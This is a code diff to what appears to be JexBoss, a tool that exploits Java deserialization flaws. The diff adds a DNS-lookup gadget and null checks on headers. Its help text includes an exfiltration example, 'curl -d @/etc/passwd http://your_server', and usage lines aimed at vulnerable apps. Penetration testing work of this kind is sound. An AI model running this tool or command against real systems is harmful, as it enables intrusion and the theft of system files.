@@ -38,7 +38,7 @@ FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
 logging.basicConfig(filename='jexboss_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)
 
 __author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
-__version__ = "1.2.3"
+__version__ = "1.2.4"
 
 RED = '\x1b[91m'
 RED1 = '\033[31m'
@@ -342,7 +342,7 @@ def check_vul(url):
                     if cookie is not None: headers['Cookie'] = cookie
                     r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
 
-                if 'x-java-serialized-object' in r.getheader('Content-Type'):
+                if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                     paths[vector] = 200
                 else:
                     paths[vector] = 505
@@ -391,7 +391,7 @@ def check_vul(url):
                         r = gl_http_pool.request('GET', url_to_check , redirect=False, headers=headers)
 
                     # if web-console/Invoker or invoker/JMXInvokerServlet
-                    if 'x-java-serialized-object' in r.getheader('Content-Type'):
+                    if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                         paths[vector] = 200
                     else:
                         paths[vector] = 505
@@ -414,7 +414,7 @@ def check_vul(url):
                         r = gl_http_pool.request('GET', url_to_check, redirect=False, headers=headers)
 
                     # if web-console/Invoker or invoker/JMXInvokerServlet
-                    if 'x-java-serialized-object' in r.getheader('Content-Type'):
+                    if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                         paths[vector] = 200
                     else:
                         paths[vector] = 505
@@ -480,8 +480,8 @@ def check_vul(url):
                 logging.info("Server %s: CHECK OTHERS PARAMETERS" % url)
             else:
                 print_and_flush(GREEN + "  [ OK ]")
-        except:
-            print_and_flush(RED + "\n * An error occurred while connecting to the host %s\n" % url + ENDC)
+        except Exception as err:
+            print_and_flush(RED + "\n * An error occurred while connecting to the host %s (%s)\n" % (url, err) + ENDC)
             logging.info("An error occurred while connecting to the host %s" % url, exc_info=traceback)
             paths[vector] = 505
 
@@ -838,6 +838,9 @@ def help_usage():
      BLUE + "\n\n For Java Deserialization Vulnerabilities in a Servlet (like Invoker):\n"+
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize\n" +
 
+     BLUE + "\n\n To test Java Deserialization Vulnerabilities with DNS Lookup:\n" +
+     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --gadget dns --dns test.yourdomain.com" +
+
      BLUE + "\n\n For Jenkins CLI Deserialization Vulnerabilitie:\n"+
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/jenkins --jenkins"+
 
@@ -1096,6 +1099,7 @@ if __name__ == "__main__":
     group_advanced.add_argument("--cmd", "-x",
                                 help="Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server)"
                                      , type=str, metavar='CMD')
+    group_advanced.add_argument("--dns", help="Specifies the dns query for use with \"dns\" Gadget", type=str, metavar='URL')
     group_advanced.add_argument("--windows", "-w", help="Specifies that the commands are for rWINDOWS System$ (cmd.exe)",
                                 action='store_true')
     group_advanced.add_argument("--post-parameter", "-H", help="Specify the parameter to find and inject serialized objects into it."
@@ -1106,7 +1110,7 @@ if __name__ == "__main__":
                                 action='store_true')
     group_advanced.add_argument("--gadget", help="Specify the type of Gadget to generate the payload automatically."
                                                  " (DEFAULT: commons-collections3.1 or groovy1 for JenKins)",
-                                    choices=['commons-collections3.1', 'commons-collections4.0', 'jdk7u21', 'jdk8u20', 'groovy1'],
+                                    choices=['commons-collections3.1', 'commons-collections4.0', 'jdk7u21', 'jdk8u20', 'groovy1', 'dns'],
                                     default='commons-collections3.1')
     group_advanced.add_argument("--load-gadget", help="Provide your own gadget from file (a java serialized object in RAW mode)",
                                 metavar='FILENAME')
@@ -1134,8 +1138,9 @@ if __name__ == "__main__":
 
     gl_args = parser.parse_args()
 
-    if gl_args.mode == 'standalone' and gl_args.host == None or \
-        gl_args.mode == 'file-scan' and gl_args.file == None:
+    if (gl_args.mode == 'standalone' and gl_args.host is None) or \
+        (gl_args.mode == 'file-scan' and gl_args.file is None) or \
+        (gl_args.gadget == 'dns' and gl_args.dns is None):
         banner()
         print (help_usage())
         exit(0)
@@ -1146,6 +1151,7 @@ if __name__ == "__main__":
         banner()
         if gl_args.proxy and not is_proxy_ok():
             exit(1)
+        if gl_args.gadget == 'dns': gl_args.cmd = gl_args.dns
         main()
 
 if __name__ == '__testing__':
@@ -1156,4 +1162,5 @@ if __name__ == '__testing__':
     timeout = Timeout(connect=1.0, read=3.0)
     gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
     _exploits.set_http_pool(gl_http_pool)
+
 
